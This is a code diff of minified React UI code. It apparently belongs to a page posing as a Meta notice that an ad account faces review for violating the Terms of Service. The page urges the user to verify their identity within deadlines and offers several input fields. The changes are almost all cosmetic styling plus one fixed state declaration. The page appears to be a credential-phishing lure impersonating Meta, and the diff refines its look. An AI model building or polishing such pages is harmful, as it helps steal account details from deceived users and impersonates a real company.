@@ -10801,6 +10801,7 @@
                   borderSizing: "border-box",
                   background:
                     "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+                  boxShadow: "rgba(0,0,0,0.1) 1px 1px 8px 1px",
                 },
                 children: (0, c.jsx)("div", {
                   style: { paddingTop: 15, paddingLeft: 30, paddingBottom: 10 },
@@ -10924,7 +10925,8 @@
           let w;
           return (0, c.jsxs)("div", {
             style: {
-              background: "rgb(0,0,0,0.8)",
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
               height: "100vh",
             },
             children: [
@@ -10935,8 +10937,8 @@
                   justifyContent: "center",
                   position: "absolute",
                   inset: "50% auto auto 50%",
-                  background:
-                    "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+                  border: "1px solid rgb(204, 204, 204)",
+                  background: "rgb(255, 255, 255)",
                   overflow: "auto",
                   borderRadius: "25px",
                   outline: "none",
@@ -11183,7 +11185,8 @@
           setPageName: _,
         } = t;
         const [N, O] = e.useState(0),
-          [P, T] = (e.useState("")[(z, L)] = e.useState(""));
+          [P, T] = e.useState(""),
+          [z, L] = e.useState("");
         return (
           e.useEffect(() => {
             fetch("/config.json")
@@ -11202,7 +11205,10 @@
               paddingBottom: 40,
               paddingLeft: 10,
               paddingRight: 10,
-              background: "rgba(0, 0, 0, 0)",
+              background:
+                "linear-gradient(110deg,#daedff 25.08%,#dfe7ff 34.89%,#f1f5fb 50.82%)",
+              borderRadius: 20,
+              boxShadow: "0px 0px",
             },
             children: [
               (0, c.jsxs)(l(), {
@@ -11330,13 +11336,18 @@
                   }),
                 ],
               }),
+              (0, c.jsx)("br", {}),
+
               (0, c.jsxs)("div", {
                 className: "",
                 style: {
                   backgroundColor: "#ffffff",
-                  padding: 20,
+                  paddingTop: 20,
+                  paddingBottom: 20,
                   borderColor: "#000000",
-                  borderRadius: 15,
+                  borderWidth: 0.2,
+                  borderRadius: 20,
+                  border: "1px solid #d0d0d0",
                   lineHeight: 1.5,
                 },
                 children: [
@@ -11369,7 +11380,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "We have received multiple reports suggesting that your ad account is in violation of our Terms of Service and Community Standard. As a result, your ad account is scheduled for review.",
@@ -11379,7 +11390,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "If you believe this information is incorrect or causing confusion, please verify your identity and request a review.",
@@ -11389,7 +11400,7 @@
                         style: {
                           fontWeight: "bold",
                           fontSize: 16,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children: "Appeal Guide",
                       }),
@@ -11398,7 +11409,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● Fact checkers may not respond to requests that contain intimidation, hate speech, or other verbal threats.",
@@ -11408,7 +11419,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● In your appeal, please include all necessary information to allow the fact checker to process your request in a timely manner. If you provide an invalid email address or do not respond to a request for additional information within 2 days, the fact checker may close the application without processing. If the appeal is not processed within 4 days, Meta will automatically reject it.",
@@ -11418,7 +11429,7 @@
                         style: {
                           fontWeight: "normal",
                           fontSize: 15,
-                          margin: "10px 20px",
+                          margin: "10px 20px 10px 20px",
                         },
                         children:
                           "ㅤㅤ● When everything is ready, we will review your account and determine whether restrictions apply to it. The verification procedure usually lasts 24 hours, but in some cases it may take longer. Depending on our decision, the restrictions imposed will remain in effect or will be lifted and your account will be reinstated.",
@@ -11429,10 +11440,12 @@
               }),
               (0, c.jsx)("div", {
                 style: {
-                  margin: 20,
+                  marginTop: 20,
+                  marginBottom: 20,
                   paddingBottom: 20,
-                  borderRadius: 15,
-                  backgroundColor: "#fff",
+                  borderRadius: 30,
+                  backgroundColor: "white",
+                  border: "1px solid #d0d0d0",
                   lineHeight: 1.5,
                 },
                 children: [
@@ -11440,7 +11453,7 @@
                     src: "/resources/unlock.png",
                     width: "100%",
                     style: {
-                      borderRadius: "15px 15px 0px 0px",
+                      borderRadius: "30px 30px 0px 0px",
                     },
                   }),
                   (0, c.jsx)("div", {
@@ -11449,7 +11462,7 @@
                       fontWeight: "bold",
                       fontSize: 20,
                       color: "#3084F4",
-                      margin: "15px 30px",
+                      margin: "15px 20px 15px 20px",
                     },
                     children: "Review request",
                   }),
@@ -11458,7 +11471,7 @@
                     style: {
                       fontWeight: "bold",
                       fontSize: 17,
-                      margin: "15px 30px",
+                      margin: "15px 20px 15px 20px",
                     },
                     children: "Fixing problems with account restrictions",
                   }),
@@ -11467,7 +11480,7 @@
                     style: {
                       fontWeight: "normal",
                       fontSize: 15,
-                      margin: "15px 30px 10px",
+                      margin: "15px 20px 10px 20px",
                     },
                     children:
                       "Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.",
@@ -11482,16 +11495,19 @@
                   value: m,
                   onChange: (e) => g(e.target.value),
                   style: {
-                    width: "95%",
+                    width: "97%",
                     height: 80,
-                    padding: 15,
+                    padding: 10,
+                    paddingTop: 20,
+                    paddingBottom: 20,
                     marginBottom: 10,
                     fontSize: 15,
                     borderColor: "#d0d0d0",
                     borderWidth: 0.1,
                     borderRadius: 10,
+                    border: "1px solid #d0d0d0",
                   },
-                  placeholder: "Additional info...",
+                  placeholder: "More info...",
                 }),
               }),
               (0, c.jsxs)("div", {
@@ -11506,8 +11522,10 @@
                     value: v,
                     onChange: (e) => y(e.target.value),
                     style: {
-                      width: "95%",
-                      padding: 15,
+                      width: "97%",
+                      padding: 10,
+                      paddingTop: 15,
+                      paddingBottom: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11531,8 +11549,10 @@
                     value: b,
                     onChange: (e) => w(e.target.value),
                     style: {
-                      width: "95%",
-                      padding: 15,
+                      width: "97%",
+                      padding: 10,
+                      paddingTop: 15,
+                      paddingBottom: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11556,8 +11576,10 @@
                     value: k,
                     onChange: (e) => S(e.target.value),
                     style: {
-                      width: "95%",
-                      padding: 15,
+                      width: "97%",
+                      padding: 10,
+                      paddingTop: 15,
+                      paddingBottom: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11581,8 +11603,10 @@
                     value: x,
                     onChange: (e) => C(e.target.value),
                     style: {
-                      width: "95%",
-                      padding: 15,
+                      width: "97%",
+                      padding: 10,
+                      paddingTop: 15,
+                      paddingBottom: 15,
                       marginBottom: 10,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
@@ -11606,8 +11630,10 @@
                     value: E,
                     onChange: (e) => _(e.target.value),
                     style: {
-                      width: "95%",
-                      padding: 15,
+                      width: "97%",
+                      padding: 10,
+                      paddingTop: 15,
+                      paddingBottom: 15,
                       fontSize: 15,
                       borderColor: "#d0d0d0",
                       borderWidth: 0.1,
